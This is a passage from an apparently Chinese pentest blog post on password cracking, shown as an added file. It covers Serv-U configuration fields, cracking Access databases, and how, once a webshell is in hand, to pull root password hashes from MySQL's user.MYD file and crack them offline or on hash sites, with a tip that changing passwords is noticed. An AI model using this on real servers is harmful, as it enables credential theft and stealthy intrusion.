+    <span class="nv">MaxNrUsers</span><span class="o">=</span>10表示最大用户连接数为10个。  
+    <span class="nv">RelPaths</span><span class="o">=</span>1表示是否锁定用户到主目录，1表示锁定。  
+    <span class="nv">ChangePassword</span><span class="o">=</span>1 表示是否可以修改密码，1表示可以。  
+    <span class="nv">DiskQuota</span><span class="o">=</span>1|104857600|0 磁盘分配大小为100MB（100×1024×1024）。  
+    <span class="nv">SpeedLimitUp</span><span class="o">=</span>102400 上传速度限制为100k/s。   
+    <span class="nv">SpeedLimitDown</span><span class="o">=</span>102400 下载速度限制为100k/s。  
+    <span class="nv">Access1</span><span class="o">=</span>d:<span class="se">\w</span>wwroot<span class="se">\z</span>t828|RL 读取和列表d:<span class="se">\w</span>wwroot<span class="se">\z</span>t828目录。
+</code></pre></div></div>
+
+<blockquote>
+  <p>6.x版本之后，升级跨度大，没有了ServUDaemon.ini文件</p>
+</blockquote>
+
+<h2 id="access数据库破解">Access数据库破解</h2>
+
+<p>Access是微软推出的一种基于Windows的桌面关系数据库管理系统，关系式数据库由一系列表组成，表由一系列行和列组成，每行是一个记录，每一列是一个字段，每个字段有一个字段名，字段名在一个表中不能重复。表与表之间可以建立关系（或称关联，连接），以便查询相关的信息。Access 数据库以文件形式保存，文件的扩展名是<code class="highlighter-rouge">.MDB</code>。Access数据库由六种对象组成，它们是表、查询、窗体、报表、宏和模块。</p>
+
+<p>破解Access数据库文件可以通过Access破解工具破解——“Access数据库特殊操作”，在窗口中选择“破解Access密码”，然后在Access文件路径中选择需要破解的文件，也可以直接输入Access文件路径。</p>
+
+<p><img src="/img/bruteforce/crack_accesspassword.png" alt="crack_accesspassword" /></p>
+
+<hr />
+
+<h2 id="mysql数据库">MySQL数据库</h2>
+
+<p>MYSQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取，例如asp代码中的conn.asp数据库连接文件，在该文件中一般都包含有数据库类型，物理位置，用户名和密码等信息；而在MYSQL中即使获取了某一个用户的数据库用户（root用户除外）的密码，也仅仅只能操作某一个用户的数据库中的数据。</p>
+
+<p>在实际攻防过程中，在获取Webshell的情况下，是可以直下载MYSQL数据库中保留用户的user.MYD文件，该文件中保存的是MYSQL数据库中所有用户对应的数据库密码，只要能够破解这些密码那么就可以正大光明的操作这些数据，虽然网上有很多修改MYSQL数据库用户密码的方法，却不可取，因为修改用户密码的事情很容易被人发现！</p>
+
+<h3 id="mysql加密方式">MySQL加密方式</h3>
+
+<p>MYSQL数据库的认证密码有两种方式，MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密，MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询，前者是MYSQL323加密，后者是MYSQLSHA1方式加密。</p>
+<ul>
+  <li>以MYSQL323方式加密</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT Old_Password('bbs.antian365.com');
+</code></pre></div></div>
+
+<ul>
+  <li>以MYSQLSHA1方式加密</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT Password('bbs.antian365.com');
+</code></pre></div></div>
+<p>查询结果MYSQLSHA1 = <em>A2EBAE36132928537ADA8E6D1F7C5C5886713CC2    执行结果如图1所示，MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中</em>是不加入实际的密码运算中，通过观察在很多用户中都携带了“<em>”，在实际破解过程中去掉“</em>”，也就是说MYSQLSHA1加密的密码的实际位数是40位。</p>
+
+<h3 id="mysql数据库文件结构">MYSQL数据库文件结构</h3>
+
+<p><strong>1.MYSQL数据库文件类型</strong>
+MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件，“.frm”是描述表结构的文件，
+“.MYD”是表的数据文件，“.MYI”是表数据文件中任何索引的数据树。一般是单独存在一个文件夹中，默认是在路径“C:\Program Files\MYSQL\MYSQL Server 5.0\data”下。</p>
+
+<p><strong>2.MYSQL数据库用户密码文件</strong>
+在MYSQL数据库中所有设置默认都保存在“C:\Program Files\MYSQL\MYSQL Server 5.0\data\MYSQL”中，也就是安装程序的data目录下，如图2所示，有关用户一共有三个文件即user.frm、user.MYD和user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。</p>
+
+<h3 id="破解mysql密码">破解MYSQL密码</h3>
+
+<ul>
+  <li>获取MYSQL数据库用户密码加密字符串</li>
+</ul>
+
+<p>使用UltraEdit-32编辑器直接打开user.MYD文件，打开后使用二进制模式进行查看，可以看到在root用户后面是一串字符串，选中这些字符串将其复制到记事本中，这些字符串即为用户加密值，即506D1427F6F61696B4501445C90624897266DAE3。（通常拿到shell之后，看服务器是否安装使用了MySql，通常是all user目录去找快捷方式，或者是其他方法（默认路径或者是猜到路径），跳转到mysql目录下的datamysql下，下载user.MYD文件，通过记事本，或者C32等查看，特殊情况可能查看的非正规位数时候，下载user.MYI 、user.frm和user.MYD三个文件，本地安装mysql进行查看！16位即是mysql 323的，40位即是mysql sha1的，mysql 323算法相对于mysql sha1较脆弱，比较容易破解，这里不详解了，因为这批彩虹表是针对mysql sha1的！）</p>
+
+<blockquote>
+  <p>注意：<br />
+（1）root后面的“*”不要复制到字符串中。<br />
+（2）在有些情况下需要往后面看看，否则得到的不是完整的MYSQLSHA1密码，总之其正确的密码位数是40位.</p>
+</blockquote>
+
+<ul>
+  <li>使用cain或者是PasswordsPro等工具破解</li>
+  <li>使用在线网站破解：
+    <ul>
+      <li><a href="http://www.cmd5.com/">cmd5</a></li>
+      <li><a href="https://hashcracking.ru/index.php">AskCheck</a></li>
+      <li><a href="http://www.mysql-password.com/hash">mysql-password</a></li>
+      <li><a href="https://www.objectif-securite.ch/en/ophcrack.php">在线ophcrack</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h1>#</h1>
+
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/27/open-RDP/">开启RDP
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/11/29/proxy/">代理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2016/09/14/reading-notes/">reading-notes</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2016/09/28/install-docker/">ubuntu16.04 install docker</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2016/09/21/brute-force/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2016/09/21/brute-force/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
